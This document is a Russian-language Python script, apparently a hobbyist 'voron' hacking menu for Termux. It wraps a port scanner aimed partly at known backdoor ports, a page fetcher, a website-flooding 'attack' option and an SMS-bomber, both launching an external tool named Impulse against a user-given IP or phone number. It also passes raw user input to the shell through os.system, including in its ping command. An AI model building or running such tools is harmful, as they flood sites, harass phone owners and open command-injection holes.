import socket
import os
import time
import requests
import html2text
os.system('clear')
ver=('1.3')
progs=('\n  атака на сайт - - -\033[31msa\033[32m.\n  бомбер СМС   - - -\033[31mafg\033[32m.\n  сканер сайтов - - -\033[31myzel\033[32m.\n  сканер портов - - -\033[31mport\033[32m.\n')
mb=('2.56')
def a_1():
    os.system('clear')
    print('''
\033[32mдоступ к системе voron открыт.
\033[35mверсия 1.3
\033[32m
''')
    print('\033[32m-v-o-r-o-n-')
    def enter():
        enter=input('\033[32m: ')
        enter=enter.lower()
        if enter=='help' or enter=='h' or enter=='-h' or enter=='помощь' or enter=='помоги' or enter=='хелп' or enter=='he' or enter=='hr':
            b_help()
        elif enter=='port_scan' or enter=='сканер портов' or enter=='port':
            b_7()
        elif enter=='autors':
            b_8()
        elif enter=='ost':
            b_1()
        elif enter=='o':
            os.system('clear')
        elif enter=='voron':
            b_9()
        elif enter=='bomber' or enter=='afg' or enter=='бомбер' or enter=='бомбер смс' or enter=='смс бомбер':
            b_3()
        elif enter=='block_111':
            print(progs)
            
        elif enter=='voron-inf' or enter=='voron-info' or enter=='inf' or enter=='info' or enter=='информация':
            b_10()
        elif enter=='ip' or enter=='ping':
            o=input('хост: ')
            os.system('ping '+str(o)+' >>ping_ip.txt')
            l=open(r'ping_ip.txt','r')
            l=l.read()
            os.system('rm -rf ping_ip.txt')
            print(str(l))
        elif enter=='yzel' or enter=='узел' or enter=='сканер сайта':
            def re():
                f=input('ссылка: ')
                s=requests.get(f)
                print(s.text)
            def rer():
                f=input('ссылка: ')
                s=requests.get(f)
                d=html2text.HTML2Text().handle(s.text)
                print(d)
            cer=input('[1] код страницы.\n[2] текст страницы.\n\n~  ')
            if cer=='1':
                re()
            elif cer=='2':
                rer()
        elif enter=='pas' or enter=='pass' or enter=='password':
            print('''
afg - - dbrnjhbz
sa  - - afhe
''')
        elif enter=='v-v':
            print('''
1.1 август 2020 года.
1.2 ноябрь 2020 года.
1.3 ноябрь 2020 года.
''')    
        elif enter=='mb':
            print('вес системы voron составляет '+str(mb))
        elif enter=='sa':
            sa()
        else:
            os.system(enter)
            print('\033[32m---------')
#---------------------
    def b_1():
        print('''
o         - очистка экрана.
block_111 - показ установленых программ в Voron.
mb        - вес системы voron.''')
    def b_3():
            c_1()
    def b_help():
        print('''доступные команды:
autors      - авторы программы voron.
-----------
ost         - основные команды системы.
-----------
voron       - полный доступ к системе.
voron-inf   - документация системы.
v-v         - версии voron.
password    - коды и пароли доступа.
''')
    def b_7():
        def openports(ip):
            x=1
            for port in [21, 22, 23, 25,31,41, 43, 45, 53,59, 68, 79, 80, 99, 110, 113, 115, 119, 121, 123, 135, 139, 143, 161, 179, 220, 389, 421, 443, 445, 456, 531, 555, 666, 911,
                         993, 999, 1001, 1010, 1011,1012,1015,1024,1024,1042,1045,1090,1170,1243,1245,1269,1492,1509,1600, 1723,1807,1981,1999,2023,2115, 2140, 2155, 2283, 2600, 2801, 3024,
                         2049, 3128, 3129, 3150, 3459, 3700, 3791, 4092, 3459, 3700, 3791,3306, 3389, 4321, 4567, 4590, 5000, 5001, 5011, 5031, 5321, 5400, 5401, 5550, 5555, 5556, 5060, 8080,
                         5569, 5631, 5742, 6400, 6669, 5631, 5742, 6400, 6669, 6670, 6771, 6776, 6912, 6939, 6970, 7000, 7300, 7301, 7306, 7307, 7308, 7789, 9091, 9400, 9090, 9872, 9873, 9874,
                         9875, 9876, 9878, 9989, 10101, 10520, 10607, 11000, 11225, 12076, 12223, 12345, 12346, 12361, 12362, 12631, 13000, 16969, 17300, 20000, 20001, 20203, 21544, 22222, 23456,
                         23476, 23477, 27374, 30029, 30100, 30101, 30102, 30103, 30999, 31336, 31337, 31339, 31666, 31785, 31787, 31789, 31791, 33333, 33911, 34324, 33911, 40412, 40421, 40422, 40423,
                         40426, 50505, 50766, 53001, 54320, 54321, 60000, 61466, 65000, 1349, 2989, 3801, 10067, 10167, 26274, 29891, 31337, 31338, 31789, 31791, 47262,54321]:
                try:
                    sock = socket.socket()
                    sock.settimeout(0.2)
                    sock.connect((ip, port))
                    print('\033[32mпорт:: %s' % port, ':: открыт')
                    sock.close()
                except:
                    print('\033[31mпорт:: %s' % port, ':: закрыт')
            print('\033[32mготово.')
            a_1()
        def openports2():
            ip=input('IP: ')
            port=int(input('PORT: '))
            for lol in[port]:
                try:
                    sock = socket.socket()
                    sock.settimeout(0.2)
                    sock.connect((ip, lol))
                    print('\033[32mпорт:: %s' % lol, ':: открыт')
                    sock.close()
                except:
                    print('\033[31mпорт:: %s' % lol, ':: закрыт')
            print('\033[32mготово.')
            a_1()
        print('''
[1] сканирование стандартных портов.
[2] сканирование определенного порта. 

''')
        x=input('~ ')
        if x=='1':
            openports(input('IP: '))
        if x=='2':
            openports2()
    def b_8():
        os.system(r'clear')
        print('\033[31m- - T')
        time.sleep(0.1)
        os.system(r'clear')
        print('\033[32m- - To')
        time.sleep(0.1)
        os.system(r'clear')
        print('\033[33m- - Top')
        time.sleep(0.1)
        os.system(r'clear')
        print('\033[34m- - Topo')
        time.sleep(0.1)
        os.system(r'clear')
        print('\033[35m- - Topo1')
        time.sleep(0.1)
        os.system(r'clear')
        print('\033[36m- - Topo1u')
        time.sleep(0.1)
        os.system(r'clear')
        print('\033[34m- - Topo1us')
        time.sleep(0.1)
    def b_9():
        x=input('код доступа: ')
        print('\033[31mотказано в доступе.')
        print('\033[32m:).')
        print('за кодом доступа Вы можете обратиться к автору.\nтак как автор любит комедии, Вы должны пройти испытание.')
        time.sleep(5)
        os.system('clear')
        print('пасхалка.\nавтор в группе Termux_Cod.\nищите записи с кодовым словом \033[31mTopo1us\033[32m.')
    def b_10():
        #voron-inf
        print('обновление voron будут релизоваться по выходным дням.\nверсия '+str(ver)+' содержит:'+str(progs))
#----------------------
#S-A
    def sa():
        try:
            print('если не знаете IP(айпи) сайта то напишите \033[31m119\033[32m.')
            target=input('\nIP: ')
            if target=='119':
                print('\nдля того чтобы узнать IP(айпи) сайта,\nВам нужно ввести команду ping или ip и название сайта.\nпример:\n   ip\n   vk.com\nзатем выйдет строка с IP сайта в скобках,\nк примеру (167.35.234.12).')
            else:
                time_atack=input('время атаки в секундах: ')
                os.system(r'python Impulse\impulse.py --method HTTP --target '+str(target)+' --time '+str(time_atack)+' --threads 135')
        except:
            print('Ковальски, у нас ошибка.')
#----------------------
#A-F-G 
    def c_1():
        try:
            target=input('номер: ')
            time_atack=input('время атаки в секундах: ')
            os.system(r'python Impulse\impulse.py --method SMS --target '+str(target)+' --time '+str(time_atack)+' --threads 135')
        except:
            print('Ковальски, у нас ошибка.')
########################
    while True:
        enter()

try:
    a_1()
except:
    print('ошибка 101.\nобратитесь к создателю.')
    renable=input('перезапустить voron?\n: ')
    renable=renable.lower()
    if renable=='y' or renable=='yes' or renable=='д' or renable=='да':
        a_1()
    elif renable=='n' or renable=='no' or renable=='н' or renable=='нет':
        print('voron закрыт.')